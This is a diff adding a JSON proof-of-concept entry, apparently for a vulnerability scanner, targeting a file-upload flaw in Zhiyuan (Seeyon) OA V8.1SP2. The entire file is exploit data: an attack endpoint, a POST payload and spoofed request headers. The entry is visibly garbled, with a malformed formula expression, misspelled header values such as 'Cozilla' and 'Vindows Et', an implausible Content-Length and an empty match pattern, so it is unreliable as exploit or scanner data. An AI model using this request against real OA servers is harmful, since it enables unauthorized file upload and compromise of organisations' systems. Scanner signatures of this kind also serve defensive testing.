@@ -1,0 +1,22 @@
+{
+	"name":"致远OA_V8.1SP2文件上传",
+	"tag":"zhiyuan",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/seeyou/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4C1oud",
+		"pocPost":"arguments={\"formulaName\":\"test\",\"formulaAlias\":\"safe_pre\",\"formulaType\":\"2\",\"formulaExpression\":\",\"sample\",\"I\"}",
+		"header":{
+			"Cookie":" JSESSIONID",
+			"Accept":" text/html, image/gif, image/ipeg, */*; q=.2, */*; q=.2",
+			"Cache-Control":" no-cache",
+			"User-Agent":" Cozilla/5.0 (Vindows Et 6.1; Sow64, rident/7.0; ry",
+			"Connection":" close",
+			"X-Forwarded-For":" 1.2.3.4",
+			"Accept-Encoding":" gzip, deflate",
+			"Content-Length":" 522729",
+			"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
